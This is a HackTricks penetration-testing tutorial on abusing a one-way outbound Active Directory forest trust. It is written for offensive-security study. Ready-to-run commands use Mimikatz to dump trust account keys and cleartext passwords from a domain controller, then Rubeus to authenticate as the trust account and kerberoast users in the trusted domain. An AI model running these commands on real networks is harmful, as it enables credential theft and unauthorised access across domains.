# External Forest Domain - One-Way (Outbound)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.

## Enumeration

### Outbound Trust

```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```

## Trust Account Attack

When an Active Directory domain or forest trust is set up from a domain _B_ to a domain _A_ (_**B**_ trusts A), a trust account is created in domain **A**, named **B. Kerberos trust keys**,\_derived from the **trust account’s password**, are used for **encrypting inter-realm TGTs**, when users of domain A request service tickets for services in domain B.

It's possible to obtain the password and hash of the trusted account from a Domain Controller using:

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```

The risk is because of trust account B$ is enabled, **B$’s Primary Group is Domain Users of domain A**, any permission granted to Domain Users applies to B$, and it is possible to use B$’s credentials to authenticate against domain A.

{% hint style="warning" %}
Therefore, f**rom the trusting domain it's possible to obtain a user inside the trusted domain**. This user won't have a lot of permissions (just Domain Users probably) but you will be able to **enumerate the external domain**.
{% endhint %}

In this example the trusting domain is `ext.local` and the trusted one is `root.local`. Therefore, a user called `EXT$` is created inside `root.local`.

```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```

Therefore, at this point have **`root.local\EXT$`**’s current **cleartext password and Kerberos secret key.** The **`root.local\EXT$`** Kerberos AES secret keys are on identical to the AES trust keys as a different salt is used, but the **RC4 keys are the same**. Therefore, we can **use the RC4 trust key** dumped from ext.local as to **authenticate** as `root.local\EXT$` against `root.local`.

```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```

With this you can start enumerating that domain and even kerberoasting users:

```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```

### Gathering cleartext trust password

In the previous flow it was used the trust hash instead of the **clear text password** (that was also **dumped by mimikatz**).

The cleartext password can be obtained by converting the \[ CLEAR ] output from mimikatz from hexadecimal and removing null bytes ‘\x00’:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Sometimes when creating a trust relationship, a password must be typed in by the user for the trust. In this demonstration, the key is the original trust password and therefore human readable. As the key cycles (30 days), the cleartext will not be human-readable but technically still usable.

The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT using the Kerberos secret key of the trust account. Here, querying root.local from ext.local for members of Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## References

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
